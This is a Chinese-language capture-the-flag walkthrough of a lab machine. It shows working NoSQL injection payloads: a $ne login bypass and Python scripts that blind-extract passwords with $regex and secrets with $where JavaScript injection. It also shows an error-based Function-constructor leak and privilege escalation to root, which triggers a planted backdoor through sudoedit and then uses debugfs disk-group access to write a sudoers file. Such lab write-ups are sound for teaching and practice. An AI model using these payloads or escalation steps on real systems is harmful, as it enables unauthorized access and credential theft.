# 信息收集

```bash
IP=192.168.205.172
nmap -p- --min-rate 10000 $IP
nmap -sV -sC -p22,80,5000,27017 $IP
```

四个端口全开：

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 10.0
80/tcp    open  http    lighttpd 1.4.82
5000/tcp  open  http    Werkzeug 3.1.5 (Python 3.12.12)
27017/tcp open  mongodb MongoDB 4.4.6
```

27017 是 MongoDB，尝试直接 mongo 连上去枚举，没有认证凭据，`show dbs`、`show collections` 全部 Unauthorized。

80 端口是 lighttpd 托管的静态页面，标题 "NexGen Systems | Developer Portal"，是一份 API 文档，给出了三个端点的调用格式。5000 端口就是实际的 Flask 服务。

文档里的暗示相当直白：

- `POST /api/v1/auth/login` 的 password 字段类型标注为 `string | object`，明示 NoSQL 注入
- `POST /api/v2/resource/metadata` 描述里写 "pattern-matching filtering"，支持操作符查询
- `GET /api/v3/system/diagnostic?probe_id={id}` 写着 "JS-engine evaluation"，还提到会注入 `env_flag` 做遥测审计

页面底部三行注释更直接：`document-oriented storage`、`operator-based overrides`、`JS-engine evaluation`，等于把攻击面全摆台面上了。

# NoSQL 注入与密码提取

## 登录绕过

password 支持 object 类型，直接用 `$ne` 绕：

```bash
curl -s http://$IP:5000/api/v1/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":null}}'
```

```json
{"role":"viewer","status":"authenticated","token":"eyJ..."}
```

登录成功但 role 是 viewer，不是 admin。这里卡了挺久，后来拿到源码才知道，代码里专门判断了如果 username 是 admin 且 password 是 dict 类型，会强制降级为 viewer。想拿 admin 权限的 token 必须用真实密码登录。

而且后面两个接口的鉴权头是 `Authorization: <JWT>` 而不是 `Authorization: Bearer <JWT>`，一开始加了 Bearer 前缀一直 403，在这上面也浪费了不少时间。

## 盲注提取密码

login 端点配合 `$regex` 可以做布尔盲注。认证成功返回 `authenticated`，失败返回 `failed`，区分度很好。

保存为 `blind.py` 执行：

```python
import requests, string

url = "http://192.168.205.172:5000/api/v1/auth/login"
headers = {"Content-Type": "application/json"}
chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=.,"

def esc(s):
    out = ""
    for c in s:
        if c in r'\.+*?^${}()|[]':
            out += '\\' + c
        else:
            out += c
    return out

for user in ["admin", "guest", "operator"]:
    pwd = ""
    for i in range(50):
        found = False
        for c in chars:
            payload = {"username": user, "password": {"$regex": "^" + esc(pwd + c)}}
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            if "token" in r.text:
                pwd += c
                found = True
                break
        if not found:
            break
    print(f"{user}: {pwd}")
```

```bash
python3 blind.py
```

三组凭据提取出来：

- admin: `P@ss_Str0ng_9821`
- guest: `guest_pw_123`
- operator: `op_secure_992`

用 admin 明文密码重新登录，拿到 admin role 的 token：

```bash
TOKEN=$(curl -s http://$IP:5000/api/v1/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"P@ss_Str0ng_9821"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
```

## v2 端点枚举用户

v2 不是主线必要步骤，仅用于验证用户表内容。拿到 admin token 后用 metadata 端点做了下枚举，确认系统中存在 3 个用户：guest(uid=101)、operator(uid=102)、admin(uid=999)。密码和前面盲注结果一致，没发现其他有用字段。

# JS 注入提取 SSH 凭据

diagnostic 端点的 `probe_id` 参数存在 `$where` 注入。文档提到会把 `env_flag` 注入到 JS 执行上下文中，思路就是通过注入把这个变量的值读出来。

用 `env_flag.startsWith()` 做布尔盲注，逐字符提取。保存为 `flag.py` 执行：

```python
import requests, string

BASE = "http://192.168.205.172:5000"
TOKEN = "<admin_token>"
CHARSET = string.ascii_letters + string.digits + "_{}-!@#$%^&*().,:"

def is_true(expr):
    payload = f"0' || ({expr}) || '1'=='2"
    r = requests.get(f"{BASE}/api/v3/system/diagnostic", params={"probe_id": payload}, headers={"Authorization": TOKEN}, timeout=8)
    return '"status":"Online"' in r.text

flag = ""
for _ in range(80):
    hit = False
    for ch in CHARSET:
        trial = flag + ch
        trial_esc = trial.replace("\\", "\\\\").replace("'", "\\'")
        if is_true(f"env_flag.startsWith('{trial_esc}')"):
            flag += ch
            hit = True
            print("[+]", flag)
            break
    if not hit:
        break
print("FINAL:", flag)
```

```bash
python3 flag.py
```

逐字符跑出来：`FLAG{cat:c4tc4tc4t}`

也可以用更暴力的方式，通过 `this.constructor.constructor` 在 Function 构造器里执行代码，配合 `throw` 把结果通过错误信息外带：

```bash
curl -s --get "http://$IP:5000/api/v3/system/diagnostic" --data-urlencode "probe_id=1' || this.constructor.constructor('throw arguments.callee.caller.toString()')() || '1'=='" -H "Authorization: $TOKEN"
```

错误信息里直接返回了完整的 $where 函数源码：

```
function() { var env_flag='FLAG{cat:c4tc4tc4t}'; return this.uid == '1' || ... }
```

`FLAG{cat:c4tc4tc4t}` 的格式是 `用户名:密码`，这就是 SSH 的登录凭据。

# 获取初始 Shell

```bash
ssh cat@$IP
```

密码 `c4tc4tc4t`，成功登录。

上来后执行 `cat user.txt` 看到一堆莫名其妙的编译日志在刷屏，非常诡异。研究了一下发现 `/usr/bin/cat` 被替换了：

```bash
which cat
head -n 5 /usr/bin/cat
```

`/usr/bin/cat` 实际是一个脚本，内容指向 `/bin/gencat`（genact，一个假终端活动生成器）。需要用 busybox 的真 cat 或者其他读取方式绕过：

```bash
busybox cat /home/cat/user.txt
# 或者
tac /home/cat/user.txt
```

# 横向移动到 dog

做文件时间线分析时注意到 `/var/www/localhost/static/shamao.jpg`，279KB，修改时间 2026-02-06，在一堆系统文件里很突兀。还有个 `/var/www/localhost/static/.trash` 内容是 `Maybe you should find a backdoor?`。

把图片拉回 Kali 跑 stegseek：

```bash
stegseek shamao.jpg /usr/share/wordlists/rockyou.txt
```

```
[i] Found passphrase: "Serialace"
[i] Original filename: "pass.txt"
[i] Extracting to "shamao.jpg.out"
```

```bash
cat shamao.jpg.out
```

```
eKCy4MrdnDAuQwcR
```

这个字符串是 base62 编码，解码后是 `d0ggd0ggd0gg`，这是 dog 用户的密码。

```bash
su - dog
```

输入 `d0ggd0ggd0gg`，成功切换。

# 提权到 root

## sudo 权限与后门分析

```bash
sudo -l
```

```
Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL PATH"
(ALL) NOPASSWD: sudoedit /etc/motd
```

dog 可以用 sudoedit 以 root 身份编辑 `/etc/motd`，且 `SUDO_EDITOR` 环境变量会被保留。

之前 linpeas 扫的时候就发现系统在运行一个叫 backdoor 的进程。查看 `/etc/local.d/backdoor.start`：

```bash
busybox cat /etc/local.d/backdoor.start
```

```sh
#!/bin/sh
TARGET_FILE="/etc/motd"
TARGET_HASH="5399e8634cc0be890edaf70a1c825c64"
EXPLOIT_TARGET="/etc/group"
{
    while true; do
        inotifywait -q -e close_write "$TARGET_FILE"
        CURRENT_HASH=$(md5sum "$TARGET_FILE" | awk '{print $1}')
        if [ "$CURRENT_HASH" = "$TARGET_HASH" ]; then
            chmod o+w "$EXPLOIT_TARGET"
        fi
    done
} &
```

用 inotifywait 监控 `/etc/motd`，MD5 匹配 `5399e8634cc0be890edaf70a1c825c64` 时把 `/etc/group` 改成所有人可写。cmd5 查了一下这个哈希，对应的明文是 `0e123456`。

```bash
echo -n "0e123456" | md5sum
```

```
5399e8634cc0be890edaf70a1c825c64
```

## 触发后门

直接 `sudoedit /etc/motd` 用 vim 编辑的话，保存时会自动加一个换行符导致 MD5 不匹配。可以在 vim 里 `:set noeol binary` 再保存，或者用 `SUDO_EDITOR` 指定一个自定义脚本精确控制写入内容：

```bash
printf '#!/bin/sh\nprintf "0e123456" > "$1"\n' > /tmp/notrail.sh
chmod +x /tmp/notrail.sh
SUDO_EDITOR="/tmp/notrail.sh" sudoedit /etc/motd
```

验证 MD5：

```bash
md5sum /etc/motd
```

```
5399e8634cc0be890edaf70a1c825c64  /etc/motd
```

等 inotifywait 触发：

```bash
sleep 2
ls -la /etc/group
```

```
-rw-r--rw-    1 root     root           650 ...
```

`/etc/group` 可写了。

## debugfs 写 sudoers 提权

`/etc/group` 可写意味着可以把自己加入 disk 组。disk 组的用户可以直接用 debugfs 读写块设备，等于拥有了对文件系统的完全控制权。

编辑 `/etc/group`，将 dog 加入 disk 组（注意 `/etc/group` 第四字段的用户列表使用逗号分隔）：

```
disk:x:6:root,dog
```

重新登录 dog 让附加组生效：

```bash
exit
su - dog
id
```

确认输出中包含 `6(disk)`。

确认根分区设备和文件系统类型：

```bash
mount | grep ' on / '
```

```
/dev/sda3 on / type ext4 (rw,relatime)
```

用 debugfs 往 `/etc/sudoers.d/` 写入一条规则，给 dog 用户无密码 sudo 权限：

```bash
printf 'dog ALL=(ALL) NOPASSWD: ALL\n' > /tmp/give_dog_sudo

/usr/sbin/debugfs -w /dev/sda3 <<'EOF'
write /tmp/give_dog_sudo /etc/sudoers.d/give_dog_sudo
sif /etc/sudoers.d/give_dog_sudo i_mode 0100440
sif /etc/sudoers.d/give_dog_sudo i_uid 0
sif /etc/sudoers.d/give_dog_sudo i_gid 0
q
EOF
```

debugfs 直接操作 ext 文件系统的 inode，写入文件并设置权限为 0440（`0100440` 中 `0100000` 表示普通文件，`0440` 为权限位）、owner 为 root:root，满足 sudoers 的安全检查要求。

```bash
sudo -l
sudo sh
id
```

```
uid=0(root) gid=0(root)
```

# Flag

```bash
busybox cat /home/cat/user.txt
busybox cat /root/root.txt
```

```
flag{user-af6b54609f58d96c373f64179758201d}
flag{root-99dc32aab0563305b639550763a02e32}
```